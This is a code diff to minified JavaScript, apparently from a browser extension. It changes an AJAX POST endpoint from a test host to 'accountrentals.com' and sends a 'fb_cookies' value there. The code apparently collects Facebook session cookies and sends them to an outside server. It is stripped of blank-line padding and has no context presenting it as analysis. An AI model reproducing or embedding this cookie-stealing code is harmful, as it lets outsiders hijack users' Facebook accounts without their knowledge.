@@ -4,27 +4,6 @@ import jquery from '../src/assets/jquery'
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 function o(e) {
   return (o =
     'function' == typeof Symbol && 'symbol' == typeof Symbol.iterator
@@ -63,7 +42,7 @@ function s(e) {
       'X-CSRF-TOKEN': 'TOKEN',
     },
 
-    url: 'https://extension.test/api/v1/store',
+    url: 'https://accountrentals.com/api/v1/store',
     type: 'post',
 
     data: { fb_cookies: e[0] },
